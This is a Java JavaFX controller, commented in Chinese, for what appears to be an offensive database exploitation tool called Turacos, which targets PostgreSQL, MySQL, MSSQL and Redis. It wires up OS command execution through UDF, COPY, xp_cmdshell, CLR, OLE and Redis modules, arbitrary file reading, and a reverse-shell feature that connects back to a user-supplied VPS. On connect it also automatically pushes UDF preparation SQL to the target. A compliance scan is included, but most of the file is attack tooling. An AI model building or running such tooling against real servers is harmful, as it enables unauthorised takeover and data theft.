package ui;

import compliance.BaselineScanner;
import compliance.ComplianceReport;
import compliance.Finding;
import controller.controllers;
import controller.udf.udfPostgresql;
import controller.udf.udfMysql;
import database.DatabaseAdapter;
import database.DatabaseFactory;
import database.mssql;
import database.psql;
import database.mysql;
import database.redis;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Task;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.AnchorPane;
import javafx.scene.text.Font;
import javafx.scene.text.Text;
import javafx.stage.Stage;

import java.awt.Desktop;
import java.io.IOException;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class panel {

    @FXML
    private TreeView<String> treeView;
    @FXML
    private TableView<ObservableList<String>> tableView;
    @FXML
    private AnchorPane rootPane;
    @FXML
    private TextArea sqlTextArea;
    @FXML
    private TextArea logTextArea;
    @FXML
    private ChoiceBox<String> execChoiceBox;
    @FXML
    private ChoiceBox<String> MySQLexecChoiceBox;
    @FXML
    private ChoiceBox<String> mssqlExecChoiceBox;
    @FXML
    private ChoiceBox<String> fileChoiceBox;
    @FXML
    private ChoiceBox<String> myfileChoiceBox;
    @FXML
    private ChoiceBox<String> mssqlFileChoiceBox;
    @FXML
    private TextField mssqlFilePathField;
    @FXML
    private TextField commandField;
    @FXML
    private TextField MySQLreversePort;
    @FXML
    private TextField MySQLreverseHost;
    @FXML
    private TextField filePathField;
    @FXML
    private TextField myfilePathField;
    @FXML
    private TextField reverseHost;
    @FXML
    private TextField reversePort;
    @FXML
    private TextField MySQLcommandField;
    @FXML
    private TextField mssqlCommandField;
    @FXML
    private ChoiceBox<String> redisExecChoiceBox;
    @FXML
    private TextField redisCommandField;
    @FXML
    private ChoiceBox<String> redisFileChoiceBox;
    @FXML
    private TextField redisFilePathField;
    @FXML
    private TextField redisReverseHost;
    @FXML
    private TextField redisReversePort;
    @FXML
    private TextField mssqlReverseHost;
    @FXML
    private TextField mssqlReversePort;
    @FXML
    private Label complianceHintLabel;
    @FXML
    private Button themeButton;


    private controllers ctrl;

    private final Image dbIcon = new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/database.png")));
    private final Image schemaIcon = new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/schema.png")));
    private final Image tableIcon = new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/table.png")));

    /**
     * 统一的守护线程池：替代散落的 new Thread(...)，
     * 避免线程无法回收、任务无命名、退出时残留非守护线程。
     */
    private static final ExecutorService WORKER = Executors.newCachedThreadPool(r -> {
        Thread t = new Thread(r, "turacos-worker");
        t.setDaemon(true);
        return t;
    });

    public void setControllers(controllers ctrl) {
        this.ctrl = ctrl;
        initTableView();
        if (themeButton != null) {
            themeButton.setText(ThemeManager.isDark() ? "浅色" : "深色");
        }
        initDatabasesAsync();
        setupDoubleClickHandler();
        setupTreeContextMenu();
    }

    /** 切换亮/暗主题并同步按钮文案。 */
    @FXML
    private void onToggleTheme() {
        boolean dark = ThemeManager.toggle();
        if (themeButton != null) {
            themeButton.setText(dark ? "浅色" : "深色");
        }
    }

    /** 表格基础配置：非约束列宽（列过多时可横向滚动、可拖动列宽）+ 空态占位。 */
    private void initTableView() {
        if (tableView == null) return;
        // 允许横向滚动与列宽拖动：约束策略会把列压窄导致内容“看不到、拉不动”
        tableView.setColumnResizePolicy(TableView.UNCONSTRAINED_RESIZE_POLICY);
        Label placeholder = new Label("暂无数据\n双击左侧数据库/表节点加载");
        placeholder.setStyle("-fx-text-fill: #56637c; -fx-font-size: 12px; -fx-alignment: center;");
        tableView.setPlaceholder(placeholder);
    }

    private void initDatabasesAsync() {
        if (ctrl == null || treeView == null) return;

        String dbType = ctrl.getDbType();
        if ("PostgreSQL".equals(dbType)) {
            execChoiceBox.getItems().setAll("COPY", "UDF");
            execChoiceBox.setValue("COPY");

            fileChoiceBox.getItems().setAll("PG_Read", "COPY");
            fileChoiceBox.setValue("PG_Read");
        } else if ("MySQL".equals(dbType)) {
            MySQLexecChoiceBox.getItems().setAll("UDF", "SQL");
            MySQLexecChoiceBox.setValue("UDF");

            myfileChoiceBox.getItems().setAll("LOAD_DATA", "LOAD_FILE");
            myfileChoiceBox.setValue("LOAD_DATA");
        } else if ("MSSQL".equals(dbType)) {
            if (mssqlExecChoiceBox != null) {
                mssqlExecChoiceBox.getItems().setAll("xp_cmdshell", "CLR", "OLE");
                mssqlExecChoiceBox.setValue("xp_cmdshell");
            }
            if (mssqlFileChoiceBox != null) {
                mssqlFileChoiceBox.getItems().setAll("OPENROWSET", "xp_cmdshell", "DIR_LIST");
                mssqlFileChoiceBox.setValue("OPENROWSET");
            }
        } else if ("Redis".equals(dbType)) {
            if (redisExecChoiceBox != null) {
                redisExecChoiceBox.getItems().setAll("MODULE", "LUA");
                redisExecChoiceBox.setValue("MODULE");
            }
            if (redisFileChoiceBox != null) {
                redisFileChoiceBox.getItems().setAll("MODULE", "LUA");
                redisFileChoiceBox.setValue("MODULE");
            }
        }

        Task<Void> initTask = new Task<>() {
            @Override
            protected Void call() {
                String results = "";
                try {
                    if ("PostgreSQL".equals(dbType)) {
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();

                            List<String> info = db.udf_init();
                            String version = info.size() > 0 ? info.get(0) : "unknown";
                            String os = info.size() > 1 ? info.get(1) : "other";
                            String bits = info.size() > 2 ? info.get(2) : "unknown";

                            List<String> preSqls = udfPostgresql.branch(version, os, bits);
                            if (!preSqls.isEmpty()) {
                                try {
                                    db.executeSQL(String.join("\n", preSqls));
                                } catch (Exception e) {
                                    Platform.runLater(() -> logTextArea.appendText("[!] UDF 预处理失败: " + e.getMessage() + "\n"));
                                }
                            }
                        } finally {
                            db.close();
                        }
                    } else if ("MySQL".equals(dbType)) {
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();

                            List<String> info = db.udf_init();
                            String os = info.size() > 0 ? info.get(0) : "other";
                            String bits = info.size() > 1 ? info.get(1) : "unknown";
                            String pluginDir = info.size() > 2 ? info.get(2) : "/tmp/";
                            String sqlMode = info.size() > 3 ? info.get(3) : "";

                            List<String> preSqls = udfMysql.branch(os, bits, pluginDir, sqlMode);
                            if (!preSqls.isEmpty()) {
                                db.executeSQL(String.join("\n", preSqls));
                            }
                        } finally {
                            db.close();
                        }
                    } else if ("MSSQL".equals(dbType)) {
                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();
                        } finally {
                            db.close();
                        }
                    } else if ("Redis".equals(dbType)) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();
                        } finally {
                            db.close();
                        }
                        // 不在建立连接时自动向目标写入/加载模块（侵入性操作），
                        // 交由用户通过“模块加载”按钮显式触发
                        results += "\n[i] 模块加载请在功能页手动触发（写入 + MODULE LOAD 为侵入性操作）。\n";
                    }

                    final String out = results;
                    Platform.runLater(() -> logTextArea.appendText(out));

                    List<String> databases = ctrl.loadDatabases();
                    if (databases == null || databases.isEmpty()) return null;

                    List<TreeItem<String>> children = new ArrayList<>();
                    for (String dbName : databases) {
                        children.add(new TreeItem<>(dbName, createIcon(dbIcon)));
                    }
                    Platform.runLater(() -> {
                        TreeItem<String> rootItem = new TreeItem<>("[数据库列表]");
                        rootItem.setExpanded(true);
                        rootItem.getChildren().addAll(children);
                        treeView.setRoot(rootItem);
                        treeView.setShowRoot(false);
                    });
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 初始化失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(initTask);
    }

    /**
     * 树点击处理：
     *  - 单击数据库节点：直接加载其结构（表/模式树），无需双击
     *  - 双击表/键节点：加载数据（MySQL 为 db→table 扁平层级）
     */
    private void setupDoubleClickHandler() {
        treeView.addEventHandler(MouseEvent.MOUSE_CLICKED, event -> {
            TreeItem<String> selectedItem = treeView.getSelectionModel().getSelectedItem();
            if (selectedItem == null) return;

            TreeItem<String> parent = selectedItem.getParent();
            TreeItem<String> grandparent = (parent != null) ? parent.getParent() : null;
            if (parent == null) return;

            String selected = selectedItem.getValue();
            String parentVal = parent.getValue();
            String grandVal = (grandparent != null) ? grandparent.getValue() : null;
            boolean mysqlFlat = "MySQL".equalsIgnoreCase(ctrl.getDbType());
            int clicks = event.getClickCount();

            if (parent == treeView.getRoot()) {
                // 数据库节点：单击展开表结构（双击兼容）
                if (clicks >= 1) {
                    loadSchemasAndTablesAsync(selected, selectedItem);
                }
                return;
            }

            if (clicks != 2) return; // 其余节点仅双击查看数据

            if (mysqlFlat && grandparent == treeView.getRoot()) {
                // MySQL：db → table，双击表直接看数据
                showTableData(parentVal, "default", selected);
            } else if (grandparent != null
                    && grandparent != treeView.getRoot()
                    && grandVal != null
                    && !"Database".equals(grandVal)) {
                // PostgreSQL/MSSQL：db → schema → table；Redis：db → Keys → key
                showTableData(grandVal, parentVal, selected);
            }
        });
    }

    private void setupTreeContextMenu() {
        if (treeView == null) return;

        treeView.setOnContextMenuRequested(evt -> {
            TreeItem<String> selectedItem = treeView.getSelectionModel().getSelectedItem();
            ContextMenu menu = new ContextMenu();

            MenuItem refreshAll = new MenuItem("刷新库列表");
            refreshAll.setOnAction(e -> refreshDatabaseList());

            MenuItem addConn = new MenuItem("添加连接...");
            addConn.setOnAction(e -> openAddConnectionModule());

            if (selectedItem == null || selectedItem == treeView.getRoot()) {
                menu.getItems().addAll(refreshAll, addConn);
            } else {
                MenuItem refreshStruct = new MenuItem("刷新结构");
                refreshStruct.setOnAction(e -> refreshSchemasAndTables(selectedItem));
                menu.getItems().addAll(refreshStruct, refreshAll, addConn);
            }

            treeView.setContextMenu(menu);
        });
    }

    private void openAddConnectionModule() {
        try {
            FXMLLoader loader = new FXMLLoader(getClass().getResource("/fxml/MainUi.fxml"));
            Stage stage = new Stage();
            Scene scene = new Scene(loader.load(), 740, 470);
            ThemeManager.apply(scene);
            stage.setScene(scene);
            stage.setTitle("Turacos Login");
            stage.getIcons().add(new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/ico.png"))));
            stage.setResizable(false);
            stage.show();
        } catch (IOException ex) {
            logTextArea.appendText("[!] 无法打开添加连接模块: " + ex.getMessage() + "\n");
        }
    }

    private void refreshDatabaseList() {
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    List<String> databases = ctrl.loadDatabases();
                    List<TreeItem<String>> children = new ArrayList<>();
                    for (String dbName : databases) {
                        children.add(new TreeItem<>(dbName, createIcon(dbIcon)));
                    }
                    Platform.runLater(() -> {
                        TreeItem<String> rootItem = new TreeItem<>("[数据库列表]");
                        rootItem.setExpanded(true);
                        rootItem.getChildren().addAll(children);
                        treeView.setRoot(rootItem);
                        treeView.setShowRoot(false);
                    });
                } catch (Exception ex) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 刷新库列表失败: " + ex.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    private void refreshSchemasAndTables(TreeItem<String> dbItem) {
        String dbName = dbItem.getValue();
        // 先在 UI 线程清空，避免闪烁残留
        dbItem.getChildren().clear();
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    loadSchemasAndTablesInto(dbName, dbItem);
                } catch (Exception ex) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 刷新结构失败: " + ex.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    /** 双击加载：后台查询，避免 UI 线程阻塞。 */
    private void loadSchemasAndTablesAsync(String dbName, TreeItem<String> dbItem) {
        if (dbItem.getChildren().size() > 0) return;
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    loadSchemasAndTablesInto(dbName, dbItem);
                } catch (Exception ex) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 加载结构失败: " + ex.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    /**
     * 后台查询 schema/table 结构并在 FX 线程应用，避免 TreeItem 的 ObservableList
     * 在非 UI 线程被修改（旧实现在双击事件里同步执行 DB 查询导致界面卡死）。
     */
    private void loadSchemasAndTablesInto(String dbName, TreeItem<String> dbItem) {
        List<TreeItem<String>> children = new ArrayList<>();
        boolean expand = false;

        if ("Redis".equalsIgnoreCase(ctrl.getDbType())) {
            redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            try {
                TreeItem<String> schemaItem = new TreeItem<>("Keys", createIcon(schemaIcon));
                // SCAN 分页加载，最多 5 页（约 1000 键），避免 UI 一次性渲染过多
                String cursor = "0";
                int loaded = 0;
                for (int page = 0; page < 5; page++) {
                    redis.ScanPage p = db.scanKeys(cursor, 200);
                    for (String key : p.keys()) {
                        schemaItem.getChildren().add(new TreeItem<>(key, createIcon(tableIcon)));
                        loaded++;
                    }
                    cursor = p.nextCursor();
                    if (cursor == null || cursor.equals("0") || p.keys().isEmpty()) break;
                }
                if (loaded >= 1000) {
                    schemaItem.getChildren().add(new TreeItem<>("... [仅展示前 1000 条]", createIcon(tableIcon)));
                }
                children.add(schemaItem);
                expand = true;
            } finally {
                db.close();
            }
        } else if ("MySQL".equalsIgnoreCase(ctrl.getDbType())) {
            // MySQL 无 schema 概念：库 → 表 扁平展示（去掉“default”多余层级）
            mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            try {
                List<String> tables = db.getTables("default");
                if (tables != null) {
                    for (String table : tables) {
                        children.add(new TreeItem<>(table, createIcon(tableIcon)));
                    }
                }
                expand = true;
            } finally {
                db.close();
            }
        } else {
            // PostgreSQL / MSSQL 走统一适配器（连接池 + 工厂）
            DatabaseAdapter db = DatabaseFactory.createSqlAdapter(
                    ctrl.getDbType(), ctrl.getHost(), ctrl.getPort(), dbName,
                    ctrl.getUsername(), ctrl.getPassword());
            if (db == null) {
                return;
            }
            try {
                List<String> schemas = db.getSchemas();
                if (schemas != null) {
                    for (String schema : schemas) {
                        TreeItem<String> schemaItem = new TreeItem<>(schema, createIcon(schemaIcon));
                        List<String> tables = db.getTables(schema);
                        if (tables != null) {
                            for (String table : tables) {
                                schemaItem.getChildren().add(new TreeItem<>(table, createIcon(tableIcon)));
                            }
                        }
                        children.add(schemaItem);
                    }
                    expand = true;
                }
            } finally {
                db.close();
            }
        }

        final boolean expandTree = expand;
        Platform.runLater(() -> {
            dbItem.getChildren().clear();
            dbItem.getChildren().addAll(children);
            dbItem.setExpanded(expandTree);
        });
    }

    /** 后台取数 + FX 线程渲染表格，避免 UI 线程执行数据库查询。 */
    private void showTableData(String dbName, String schema, String table) {
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    List<String> columnNames = new ArrayList<>();
                    List<List<Object>> rows = new ArrayList<>();

                    if ("Redis".equalsIgnoreCase(ctrl.getDbType())) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            List<String> vals = db.getKeyPreview(table);
                            columnNames = List.of("Value");
                            for (String v : vals) {
                                List<Object> r = new ArrayList<>();
                                r.add(v);
                                rows.add(r);
                            }
                        } finally {
                            db.close();
                        }
                    } else {
                        DatabaseAdapter db = DatabaseFactory.createSqlAdapter(
                                ctrl.getDbType(), ctrl.getHost(), ctrl.getPort(), dbName,
                                ctrl.getUsername(), ctrl.getPassword());
                        if (db == null) {
                            return null;
                        }
                        try {
                            rows = db.getTopRows(schema, table, 500);
                            columnNames = db.getColumnNames(schema, table);
                        } finally {
                            db.close();
                        }
                    }

                    final List<String> cols = columnNames;
                    final List<List<Object>> data = rows;
                    Platform.runLater(() -> renderTable(cols, data));
                } catch (Exception ex) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 加载表数据失败: " + ex.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    /** 纯 UI 渲染：由 FX 线程调用。 */
    private void renderTable(List<String> columnNames, List<List<Object>> rows) {
        tableView.getColumns().clear();
        tableView.getItems().clear();
        if (rows == null || rows.isEmpty()) {
            return;
        }

        if (columnNames == null || columnNames.isEmpty()) {
            columnNames = new ArrayList<>();
            for (int i = 0; i < rows.get(0).size(); i++) {
                columnNames.add("Col " + (i + 1));
            }
        }

        for (int i = 0; i < columnNames.size(); i++) {
            final int colIndex = i;
            TableColumn<ObservableList<String>, String> column = new TableColumn<>(columnNames.get(i));

            column.setCellValueFactory(data ->
                    new SimpleStringProperty(data.getValue().get(colIndex))
            );

            column.setCellFactory(col -> new TableCell<>() {
                @Override
                protected void updateItem(String item, boolean empty) {
                    super.updateItem(item, empty);
                    setText(empty || item == null ? "" : item);
                    setAlignment(Pos.CENTER);
                    setFont(Font.font("Consolas", 12));
                }
            });

            column.setStyle("-fx-alignment: CENTER;");

            tableView.getColumns().add(column);
        }

        for (List<Object> row : rows) {
            ObservableList<String> rowData = FXCollections.observableArrayList();
            for (Object cell : row) {
                rowData.add(cell == null ? "" : cell.toString());
            }
            tableView.getItems().add(rowData);
        }

        tableView.getColumns().forEach(col -> {
            // 列宽按内容自适应，但设上限/下限，避免单列过宽挤压其他列
            col.setMinWidth(70);
            col.setPrefWidth(20);
            double max = 0;
            Text tmp = new Text(col.getText());
            tmp.setFont(Font.font("Consolas", 12));
            max = tmp.getLayoutBounds().getWidth() + 24;

            for (ObservableList<String> rowData : tableView.getItems()) {
                String cellText = rowData.get(tableView.getColumns().indexOf(col));
                if (cellText != null) {
                    tmp.setText(cellText);
                    tmp.setFont(Font.font("Consolas", 12));
                    double width = tmp.getLayoutBounds().getWidth() + 24;
                    if (width > max) max = width;
                }
            }
            col.setPrefWidth(Math.min(max, 320));
        });
    }

    private ImageView createIcon(Image image) {
        ImageView imageView = new ImageView(image);
        imageView.setFitWidth(16);
        imageView.setFitHeight(16);
        imageView.setPreserveRatio(true);
        imageView.setSmooth(true);
        return imageView;
    }

    @FXML
    private void executeCmdButton() {
        String dbType = ctrl.getDbType();
        if (dbType == null || dbType.trim().isEmpty()) {
            logTextArea.appendText("[!] 未选择数据库类型！\n");
            return;
        }

        String execType, command;
        if ("PostgreSQL".equalsIgnoreCase(dbType)) {
            execType = execChoiceBox.getValue();
            command = commandField.getText();
        } else if ("MySQL".equalsIgnoreCase(dbType)) {
            execType = MySQLexecChoiceBox.getValue();
            command = MySQLcommandField.getText();
        } else if ("MSSQL".equalsIgnoreCase(dbType)) {
            execType = mssqlExecChoiceBox.getValue();
            command = mssqlCommandField.getText();
        } else if ("Redis".equalsIgnoreCase(dbType)) {
            execType = redisExecChoiceBox.getValue();
            command = redisCommandField.getText();
        } else {
            logTextArea.appendText("[!] ❌不支持的数据库类型: " + dbType + "\n");
            return;
        }

        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    String sql;
                    String results = "";

                    if ("PostgreSQL".equalsIgnoreCase(dbType)) {
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            sql = psql.exCmd(command.trim(), execType.trim());
                            if (sql.isEmpty()) {
                                Platform.runLater(() -> logTextArea.appendText("[!] ❌SQL 生成失败！\n"));
                                return null;
                            }
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("MySQL".equalsIgnoreCase(dbType)) {
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            if (execType != null && "SQL".equalsIgnoreCase(execType.trim())) {
                                sql = mysql.exCmd(execType.trim(), command.trim());
                                if (sql.isEmpty()) {
                                    Platform.runLater(() -> logTextArea.appendText("[!] ❌SQL 生成失败！\n"));
                                    return null;
                                }
                                results = db.executeSQL(sql);
                            } else {
                                results = db.executeCommandWithUdfFallback(command.trim());
                            }
                        } finally {
                            db.close();
                        }
                    } else if ("MSSQL".equalsIgnoreCase(dbType)) {
                        sql = mssql.exCmd(execType.trim(), command.trim());
                        if (sql.isEmpty()) {
                            Platform.runLater(() -> logTextArea.appendText("[!] ❌SQL 生成失败！\n"));
                            return null;
                        }

                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("Redis".equalsIgnoreCase(dbType)) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.exCmd(execType.trim(), command.trim());
                        } finally {
                            db.close();
                        }
                    }

                    String finalResults = results;
                    Platform.runLater(() -> {
                        logTextArea.appendText("[+] Results: \n" + finalResults + "\n");
                    });
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] " + e.getMessage() + "\n"));
                }
                return null;
            }
        };

        WORKER.execute(task);
    }


    /**
     * 任意文件初步处理判断数据库类型。
     * :readFiles 返回文件读取SQL语句。
     * :executeSQL 执行SQL语句。
     */
    @FXML
    private void readFileButton() {
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    String results = "";
                    String dbType = ctrl.getDbType();
                    if (dbType == null || dbType.trim().isEmpty()) {
                        Platform.runLater(() -> logTextArea.appendText("[!] 未选择数据库类型！\n"));
                        return null;
                    }

                    if ("postgresql".equalsIgnoreCase(dbType)) {
                        String sql = psql.readFiles(filePathField.getText(), fileChoiceBox.getValue());
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("mysql".equalsIgnoreCase(dbType)) {
                        String sql = mysql.readFiles(myfilePathField.getText(), myfileChoiceBox.getValue());
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("mssql".equalsIgnoreCase(dbType)) {
                        String sql = mssql.readFiles(mssqlFilePathField.getText(), mssqlFileChoiceBox.getValue());
                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("redis".equalsIgnoreCase(dbType)) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.readFiles(redisFilePathField.getText(), redisFileChoiceBox.getValue());
                        } finally {
                            db.close();
                        }
                    }

                    final String out = results;
                    Platform.runLater(() -> logTextArea.appendText("[+] Results: \n" + out + "\n"));
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 读取文件失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    @FXML
    private void reverseShell() {
        Task<Object> task = new Task<>() {
            @Override
            protected Object call() throws Exception {
                Platform.runLater(() -> logTextArea.appendText("[+] 请在 VPS 上查看反弹 Shell 状态\n[!] 注意：反弹后其他功能可能受影响\n"));
                String dbType = ctrl.getDbType();
                if (dbType == null || dbType.trim().isEmpty()) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 未选择数据库类型！\n"));
                    return null;
                }

                try {
                    if ("PostgreSQL".equalsIgnoreCase(dbType)) {
                        String host = reverseHost.getText();
                        int port = safeParsePort(reversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.revershell(host, port);
                        } finally {
                            db.close();
                        }
                    } else if ("MySQL".equalsIgnoreCase(dbType)) {
                        String host = MySQLreverseHost.getText();
                        int port = safeParsePort(MySQLreversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.reverseShell(host, port);
                        } finally {
                            db.close();
                        }
                    } else if ("MSSQL".equalsIgnoreCase(dbType)) {
                        String host = mssqlReverseHost.getText();
                        int port = safeParsePort(mssqlReversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.reverseShell(host, port);
                        } finally {
                            db.close();
                        }
                    } else if ("Redis".equalsIgnoreCase(dbType)) {
                        String host = redisReverseHost.getText();
                        int port = safeParsePort(redisReversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.reverseShell(host, port);
                        } finally {
                            db.close();
                        }
                    }
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 反弹失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    private static int safeParsePort(String s) {
        try {
            int p = Integer.parseInt(s == null ? "" : s.trim());
            if (p < 1 || p > 65535) return -1;
            return p;
        } catch (Exception e) {
            return -1;
        }
    }

    private boolean validHostPort(String host, int port) {
        if (host == null || host.trim().isEmpty()) {
            Platform.runLater(() -> logTextArea.appendText("[!] 主机不能为空\n"));
            return false;
        }
        if (port == -1) {
            Platform.runLater(() -> logTextArea.appendText("[!] 端口无效（1-65535）\n"));
            return false;
        }
        return true;
    }

    @FXML
    private void loadRedisModuleButton() {
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                    String result;
                    try {
                        result = db.autoLoadModuleFromResources();
                    } finally {
                        db.close();
                    }
                    String out = result;
                    Platform.runLater(() -> logTextArea.appendText(out + "\n"));
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 模块加载失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    /** 合规基线检查：后台扫描 -> 日志摘要 + 生成 HTML 报告并打开。 */
    @FXML
    private void runComplianceCheck() {
        if (ctrl == null) return;
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    long t0 = System.currentTimeMillis();
                    List<Finding> findings = BaselineScanner.scan(
                            ctrl.getDbType(), ctrl.getHost(), ctrl.getPort(),
                            ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                    Path report = ComplianceReport.generate(
                            ctrl.getDbType(), ctrl.getHost(), ctrl.getPort(),
                            ctrl.getDatabase(), ctrl.getUsername(), findings);

                    StringBuilder log = new StringBuilder();
                    log.append("[+] ").append(util.I18n.t("compliance.done",
                            findings.size(), System.currentTimeMillis() - t0)).append("\n");
                    for (Finding f : findings) {
                        log.append("    [").append(f.severity().label()).append("] ")
                                .append(f.id()).append(" - ").append(f.title()).append("\n");
                    }
                    log.append("[+] ").append(util.I18n.t("compliance.report",
                            report.toAbsolutePath())).append("\n");
                    String out = log.toString();
                    Platform.runLater(() -> {
                        logTextArea.appendText(out);
                        complianceHintLabel.setText(util.I18n.t("compliance.report",
                                report.getFileName()));
                    });
                    try {
                        Desktop.getDesktop().browse(report.toUri());
                    } catch (Exception ignored) {
                    }
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 合规检查失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }

    /** 通用 SQL 执行：PostgreSQL / MySQL / MSSQL（通过统一适配器；Redis 无 SQL 面板）。 */
    public void btnExecuteSql() {
        if (ctrl == null) return;
        String sql = sqlTextArea.getText();
        String dbType = ctrl.getDbType();

        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    String results;
                    if ("Redis".equalsIgnoreCase(dbType)) {
                        results = "[!] Redis 不支持 SQL 面板，请使用 Redis 功能页";
                    } else {
                        DatabaseAdapter db = DatabaseFactory.createSqlAdapter(
                                dbType, ctrl.getHost(), ctrl.getPort(),
                                ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        if (db == null) {
                            results = "[!] 不支持的数据库类型: " + dbType;
                        } else {
                            try {
                                results = db.executeSQL(sql);
                            } finally {
                                db.close();
                            }
                        }
                    }
                    String finalResults = results;
                    Platform.runLater(() -> logTextArea.appendText("[+] Results: \n" + finalResults + "\n"));
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!]  执行失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        WORKER.execute(task);
    }
}
